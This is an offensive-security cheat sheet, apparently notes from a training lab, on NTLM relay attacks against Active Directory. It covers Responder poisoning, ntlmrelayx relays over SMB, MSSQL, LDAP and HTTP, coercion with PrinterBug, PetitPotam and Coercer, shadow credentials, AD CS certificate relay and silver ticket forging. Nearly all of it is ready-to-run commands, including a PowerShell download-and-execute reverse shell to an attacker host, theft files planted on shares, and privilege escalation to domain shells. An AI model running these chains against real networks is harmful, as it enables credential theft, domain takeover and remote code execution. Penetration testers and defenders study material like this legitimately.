---
description: Responder | MitM | Authenticaton | NTLMv2
---

# NTLM Relay

{% hint style="danger" %}
We can abuse a default setting in Windows when the DNS server cannot respond to a DNS request and we use `Responder` to intercept and poison requests and then grant us a Man-In-The-Middle position to perform relay attacks.\
\
Perform relays with ntlmrelayx either by poisoning with Responder or coercing using printerbug, PetitPotam, Coercer or even mssqlclient.py.
{% endhint %}

### <mark style="color:yellow;">Responder</mark>

```bash
# Analyze mode for recon
sudo python3 Responder.py -I ens192 -A

# Poisoning mode
sudo python3 Responder.py -I ens192

# Or using Pretender
./pretender -i ens192 --dry
```

{% hint style="info" %}
Analyze mode is also useful to capture traffic/hashes of protocols like SMB, MSSQL, HTTP, FTP, IMAP, and LDAP\
\
Its possible to turn off SMB or specify IP in the Responder.conf file

```
sed -i "s/SMB = On/SMB = Off/" Responder.conf
cat Responder.conf | grep -i smb

SMB = Off
```
{% endhint %}

#### Check if SMB Signing is disabled

```bash
# Check if SMB signing is disabled
python3 RunFinger.py -i 172.16.117.0/

# With nxc
nxc smb 172.16.117.0/24 --gen-relay-list relayTargets.txt
```

| Target Type           | Example                              | Multi-relaying Default Status |
| --------------------- | ------------------------------------ | ----------------------------- |
| Single General Target | -t 172.16.117.50                     | Disabled                      |
| Single Named Target   | -t smb://ZENCORP\PETER@172.16.117.50 | Enabled                       |
| Multiple Targets      | -tf relayTargets.txt                 | Enabled                       |

### <mark style="color:yellow;">NTLM Relay over SMB Attacks</mark>

#### SAM Dump

```bash
# Disable SMB in responder.conf
sed -i "s/SMB = On/SMB = Off/" Responder.conf

# Poison the network
sudo python3 Responder.py -I ens192

# NTLM Relay SMB
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support 

# Command execution
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -c 'ping -n 1 172.16.117.30'
```

#### Reverse Shell

Use [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) from [Nishang](https://github.com/samratashok/nishang) or base64 from [revshells.com](https://www.revshells.com/)

```bash
# Disable SMB in responder.conf
sed -i "s/SMB = On/SMB = Off/" Responder.conf

# Poison the network
sudo python3 Responder.py -I ens192

# NTLM Relay SMB
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support 

# Reverse shell
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -c "powershell -c IEX(New-Object NET.WebClient).DownloadString('http://172.16.117.30:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.117.30 -Port 8888"
```

### <mark style="color:yellow;">SOCKS with NTLM relay</mark>

```bash
# Disable SMB in responder.conf
sed -i "s/SMB = On/SMB = Off/" Responder.conf

# Run ntlmrelay
sudo ntlmrelayx.py -tf targets.txt -smb2support -socks

# Poison network
sudo python3 Responder.py -I ens192

# List shared folders
proxychains4 -q smbclient.py ZENCORP/RMONTY@172.16.117.50 -no-pass

# Shell
proxychains -q smbexec.py ZENCORP/PETER@172.16.117.50 -no-pass
```

{% hint style="danger" %}
Relaying can be done using various protocols like SMB, HTTP, LDAP, SMB, MSSQL, IMAP, RPC or any other application protocol capable of transmitting NTLM authentication messages.\
\
As client: HTTP, IMAP, LDAP, MSSQL, RPC, SMBv/1/2/3, SMTP

As server: HTTP(s), RAW, SMBv/1/2/3, WCF
{% endhint %}

### <mark style="color:yellow;">NTLM Relay over MSSQL</mark>

```bash
# Setup socks proxy using mssql service
sudo ntlmrelayx.py -t mssql://172.16.117.60 -smb2support -socks

# Start poisoning
python3 Responder.py -I ens192

# Connect mssql
proxychains -q mssqlclient.py ZENCORP/nports@172.16.117.60 -windows-auth -no-pass

# Direct queries
sudo ntlmrelayx.py -t mssql://ZENCORP\\NPORTS@172.16.117.60 -smb2support -q "SELECT name FROM sys.databases;"
```

{% hint style="danger" %}
Use sudo su for `ntlmrelayx.py -tf target.txt -smb2support -socks`
{% endhint %}

{% hint style="info" %}
using the `mssql://`makes `ntlmrelayx` to relay `NTLM` over `mssql` to the relay target instead of SMB.
{% endhint %}

### <mark style="color:yellow;">NTLM Relay over LDAP</mark>

```bash
# Turn off HTTP and SMB
sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" Responder/Responder.conf

# Start responder
sudo python3 Responder/Responder.py -I ens192

# Start ldap NTLM relay
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --lootdir ldap_dump

# Add computer
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'plaintext$'

# Privilege escalation
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --escalate-user 'plaintext$' --no-dump -debug
```

### <mark style="color:yellow;">NTLM Relay over All Protocols</mark>

NTLMRelayX includes support for the an "all" wildcard enabling the exploitation of every relayed connection across all services and users.

```bash
# Turn off all protocols in Responder
sed -i '4,18s/= On/= Off/g' Responder.conf

# Start poisoning
sudo python3 Responder.py -I ens192

# Run socks with NLTM relay
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -socks

# In ntlmrelay check socks for sessions
socks
```

### <mark style="color:yellow;">Attacking SMB Shares</mark>

If having write access to a smb share we can generate files an drop them in to the share. For example .url or .lnk will browse the shared folder.

#### Create theft files

```bash
python3 ntlm_theft.py -g all -s 172.16.117.30 -f '@myfile'
```

Then upload the files and use all:// scheme to try to connect to all services

```bash
# Upload theft files
smbclient.py anonymous@172.16.117.3 -no-pass

# Upload theft files with netexec
nxc smb 172.16.117.3 -u anonymous -p '' -M slinky -o SERVER=172.16.117.30 NAME=important

# Connect to services. 
ntlmrelayx.py -tf relayTargets.txt -smb2support -socks
```

### <mark style="color:yellow;">WebDav Attacks</mark>

To force authentication via HTTP instead of SMB we can use WebDAV which is an extension of HTTP that specifies the methods for carrying out fundamental file operations like copying, moving, deleting and creatin files through HTTP.

```bash
# Check if WebDav is running
nxc smb 172.16.117.0/24 -u zenpc$ -p pass123 -M webdav
```

<details>

<summary><strong>searchConnector-ms to start WebDav</strong></summary>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>https://whatever/</url>
    </simpleLocation>
</searchConnectorDescription>
```

</details>

Or use nxc to create and drop the file

```bash
nxc smb 172.16.117.3 -u anonymous -p '' -M drop-sc -o URL=https://172.16.117.30/testing SHARE=smb FILENAME=@secret
```

After user connects WebClient service will start

```bash
nxc smb 172.16.117.0/24 -u zenpc$ -p pass123 -M webdav
```

If found a host with WebDav enabled, perform HTTP authentication

```bash
smb 172.16.117.3 -u anonymous -p '' -M slinky -o SERVER=NOAREALNAME@8008 NAME=important
```

Finally start responder to poison and nltmrelay to relay the HTTP authentcation to LDAP.

```bash
# Poison
sudo python3 Responder.py -I ens192

# Ntlmrelay 
ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-smb-server --http-port 8008 --no-da --no-acl --no-validate-privs --lootdir ldap_dump
```

### <mark style="color:yellow;">Authentication Coercion</mark>

1. Authenticate to a remote machine with valid creds, like over SMB.
2. Connect to a remote SMB pipe like `\PIPE\netdfs`, `\PIPE\efsrpc`, `\PIPE\lsarpc`
3. Bind to an RPC protocol to call its methods on target.

#### With nxc drop searchConnector file

```bash
nxc smb 172.16.117.3 -u anonymous -p '' -M drop-sc -o URL=https://172.16.117.30/testing SHARE=Testing FILENAME=@secret
```

#### Check if WebDav is enabled

```bash
# Check if enabled
crackmapexec smb 172.16.117.60 -u zenpc$ -p pass123 -M webdav

# Poison
sudo python3 Responder.py -I ens192

# Ntlmrelay 
ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-smb-server --http-port 8008 --no-da --no-acl --no-validate-privs --lootdir ldap_dump
```

### <mark style="color:yellow;">MS-RPRN PrinterBug</mark>

It abuses the `RpcRemoteFindFirstPrinterChangeNotificationEx` method to force a target machine to send an **SMB NTLM authentication request** to the attacker-controlled machine. It coerces domain controllers into authenticating to the attacker.

```bash
# Trigger PrinterBug
python3 printerbug.py inlanefreight/zenpc$:'pass123'@172.16.117.3 172.16.117.30

# With SMB on receive DC01 hash
python3 Responder.py -I ens192  
```

### <mark style="color:yellow;">MS-EFSR PetitPotam</mark>

**PetitPotam** exploits methods from the **Encrypting File System Remote Protocol (MS-EFSR)**, specifically `EfsRpcOpenFileRaw` and `EfsRpcEncryptFileSrv`, to coerce SMB NTLM authentication from domain-joined machines, including domain controllers.

```bash
# Trigger
python3 PetitPotam.py 172.16.117.30 172.16.117.3 -u 'zenpc$' -p 'pass123' -d inlanefreight.local

# WebDav
python3 PetitPotam.py WIN-MMRQDG2R0ZX@80/files 172.16.117.60 -u 'zenpc$' -p 'pass123'

# Poison and get hash
python3 Responder.py -I ens192
```

### <mark style="color:yellow;">Coercer</mark>

[Coercer](https://github.com/p0dalirius/Coercer) is a powerful `authentication coercion` tool that automates the abuse of 17 methods in 5 `RPC` protocols.

#### Scan Mode

```bash
Coercer scan -t 172.16.117.50 -u 'zenpc$' -p 'pass123' -d zencorp.local -v
```

#### Coerce Mode

The `coerce` mode abuses the `RPC` calls on a victim machine to coerce authentication to relay them over to relay targets.

```
Coercer coerce -t 172.16.117.50 -l 172.16.117.30 -u 'zenpc$' -p 'pass123' -d zencorp.local -v --always-continue
```

## <mark style="color:yellow;">NTLM Relay Attacks Targeting Kerberos</mark>

For example, if we want to configure `RBCD` on `SQL01$` to trust authentication coming from `WS01$`, we need to set the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of `SQL01$` to `WS01$`. `WS01$` can then request service tickets on behalf of any user.

#### Coerce HTTP NTLM authentication to enable WebClient

```bash
# Drop searchconnector file
crackmapexec smb 172.16.117.3 -u anonymous -p '' -M drop-sc -o URL=https://172.16.117.30/testing FILENAME=@secret

# Check if WebDav is enabled
crackmapexec smb 172.16.117.0/24 -u plaintext$ -p o6@ekK5#rlw2rAe -M webdav

# Poison request
sudo python3 Responder.py -I ens192

# Start NTLMrelay with LDAP
sudo ntlmrelayx.py -t ldaps://INLANEFREIGHT\\'SQL01$'@172.16.117.3 --delegate-access --escalate-user 'plaintext$' --no-smb-server --no-dump
```

#### Coerce target into HTTP NTLM authentication against our machine

```bash
python3 printerbug.py inlanefreight/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.60 LINUX01@80/print
```

#### The impersonate and get a ticket

```bash
# Get ticket
getST.py -spn cifs/sql01.inlanefreight.local -impersonate Administrator -dc-ip 172.16.117.3 "INLANEFREIGHT"/"plaintext$":"o6@ekK5#rlw2rAe"

# And connect 
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass sql01.inlanefreight.local
```

### <mark style="color:yellow;">Shadow Credentials</mark>

`Shadow Credentials` attack effectively adds alternative credentials to an account, allowing attackers to obtain a TGT and subsequently the NTLM hash.

#### Start poisoning and run ntlmrelay

Ntlmrelayx.py will save the `.PFX` certificate and provide the password.

```bash
# Responder
sudo python3 Responder.py -I ens192

# Relay targeting LDAP using NTLM auth
ntlmrelayx.py -t ldap://ZENCORP.LOCAL\\CJAQ@172.16.117.3 --shadow-credentials --shadow-target jperez --no-da --no-dump --no-acl
```

After this get the TGT ticket and connec to dc01

```bash
# Get ticket
python3 gettgtpkinit.py -cert-pfx rbnYdUv8.pfx -pfx-pass NRzoep723H6Yfc0pY91Z ZENCORP.LOCAL/jperez jperez.ccache

# Winrm into DC
KRB5CCNAME=jperez.ccache evil-winrm -i dc01.zencorp.local -r ZENCORP.LOCAL
```

### <mark style="color:yellow;">NTLM Relay Attacks Targeting AD CS</mark>

AC CS manages digital certificates, including issuance for communications, digital signing and encryption.

```bash
# Find out which host AD CS service is running
crackmapexec ldap 172.16.117.0/24 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -M adcs

# List all certificates
crackmapexec ldap 172.16.117.3 -u plaintext$ -p 'o6@ekK5#rlw2rAe' -M adcs -o SERVER=INLANEFREIGHT-DC01-CA
```

#### Using Certipy which can enumerate and attack all of the ESC attacks.

```bash
certipy find -enabled -u 'plaintext$'@172.16.117.3 -p 'o6@ekK5#rlw2rAe' -stdout
```

#### Check if NTLM is used to check if endpont is exploitable

```bash
# Using Curl
curl -I http://172.16.117.3/certsrv/

# Using NTLMRecon
./NTLMRecon -t http://172.16.117.3/ -o json | jq
```

### <mark style="color:yellow;">**Run ntlmrelayx to Perform AD CS Relay Attacks**</mark>

```
sudo ntlmrelayx.py -t http://172.16.117.3/certsrv/certfnsh.asp -smb2support --adcs --template Machine
```

#### Use printerbug to coerce SMB NTLM authentication

```bash
python3 printerbug.py inlanefreight/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.50 172.16.117.30
```

#### After coercion ntlmrelay will relay over HTTP to the web endpoint and return a base64 certificate.

```bash
# Decode certificate
echo -n "MIIRPQIBAzCCEPcGCSqGSIb3DQEHAaCCEOgEghDkMIIQ4DCCBxcGCSqGSIb3DQEHBqCCBwgwggcEAgEAMI<SNIP>U6EWbi/ttH4BAjUKtJ9ygRfRg==" | base64 -d > ws01.pfx
```

#### Get TGT ticket and AS-REP encryption key

```sh
python3 gettgtpkinit.py -dc-ip 172.16.117.3 -cert-pfx ws01.pfx 'INLANEFREIGHT.LOCAL/WS01$' ws01.ccache
```

#### Retrieve the NT hash

```bash
KRB5CCNAME=ws01.ccache python3 getnthash.py 'INLANEFREIGHT.LOCAL/WS01$' -key 917ec3b9d13dfb69e42ee05e09a5bf4ac4e52b7b677f1b22412e4deba644ebb2
```

#### Forge a silver ticket

```bash
# Lookup SID
lookupsid.py 'INLANEFREIGHT.LOCAL/WS01$'@172.16.117.3 -hashes :3d3a72af94548ebc7755287a88476460

# Forge silver ticket
ticketer.py -nthash 3d3a72af94548ebc7755287a88476460 -domain-sid S-1-5-21-1207890233-375443991-2397730614 -domain zencorp.local -spn cifs/ws01.zencorp.local Administrator

# Get a shell
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass ws01.zencorp.local
```

### <mark style="color:yellow;">Certipy</mark> <mark style="color:yellow;">**AD CS attacks**</mark>

```bash
# Run certipy relay
sudo certipy relay -target "http://172.16.117.3" -template Machine

# Trigger printerbug 
python3 printerbug.py zencorp/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.50 172.16.117.30

# Use auth command to obtain the hash
certipy auth -pfx ws01.pfx -dc-ip 172.16.117.3
```
